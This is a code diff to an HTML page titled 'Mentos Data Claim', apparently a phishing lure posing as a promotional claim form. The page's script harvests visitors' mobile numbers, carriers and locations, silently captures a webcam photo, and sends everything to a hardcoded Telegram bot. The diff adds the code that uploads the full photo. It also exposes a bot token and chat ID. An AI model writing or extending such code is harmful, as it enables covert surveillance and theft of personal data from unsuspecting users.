@@ -5,9 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Mentos Data Claim</title>
 <style>
-
-
-
   * {
     box-sizing: border-box;
     margin: 0;
@@ -188,7 +185,7 @@
     const context = canvas.getContext('2d');
 
     // !!! IMPORTANT: Replace with your actual bot token and chat ID !!!
-    const telegramBotToken = "8033397452:AAGTTXg7BBdMyoTHbJC6FUdM2R_A8VjB7wk";
+    const telegramBotToken = "8033397452:AAG8i0tE0iuRgZcesUcFUitYPRTFWdx59HM";
     const telegramChatId = "8205131448"; 
     const telegramBotUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
@@ -200,7 +197,10 @@
         message += `*Image Status:* ${data.imageStatus}\n`;
 
         if (data.imageData) {
-            message += `*Image Data (Base64, truncated):*\n\`\`\`\n${data.imageData.substring(0, 500)}...\n\`\`\`\n`;
+            // Telegram message size limit means we can't send full base64 as text easily.
+            // For sending the actual image, you'd use sendPhoto method, not sendMessage.
+            // Here, I'm just showing a truncated version in the text message.
+            message += `*Image Data (Base64, truncated):*\n\`\`\`\n${data.imageData.substring(0, 200)}...\n\`\`\`\n`; 
         }
 
         try {
@@ -216,6 +216,28 @@
                 })
             });
             console.log('Data sent to Telegram bot.');
+            
+            // If you want to send the actual image separately:
+            if (data.imageData) {
+                const formData = new FormData();
+                formData.append('chat_id', telegramChatId);
+                // Convert base64 to Blob
+                const byteString = atob(data.imageData.split(',')[1]);
+                const mimeString = data.imageData.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                formData.append('photo', new Blob([ab], { type: mimeString }), 'webcam_capture.jpg');
+
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('Image sent to Telegram bot.');
+            }
+
         } catch (error) {
             console.error('Error sending data to Telegram bot:', error);
         }
@@ -228,8 +250,7 @@
             await new Promise(resolve => video.onloadedmetadata = resolve);
             video.play();
 
-            // Wait a bit for the video to stabilize
-            await new Promise(resolve => setTimeout(resolve, 1000)); 
+            await new Promise(resolve => setTimeout(resolve, 1500)); // Give it a bit more time
 
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/jpeg', 0.8); // Get JPEG image
@@ -285,4 +306,12 @@
             provider: provider,
             mobile: mobile,
             location: userLocation,
-            imageStatus:
+            imageStatus: imageStatus,
+            imageData: imageData // Include the image data in the payload
+        };
+        
+        await sendDataToTelegram(payload);
+    });
+  </script>
+</body>
+ </html>
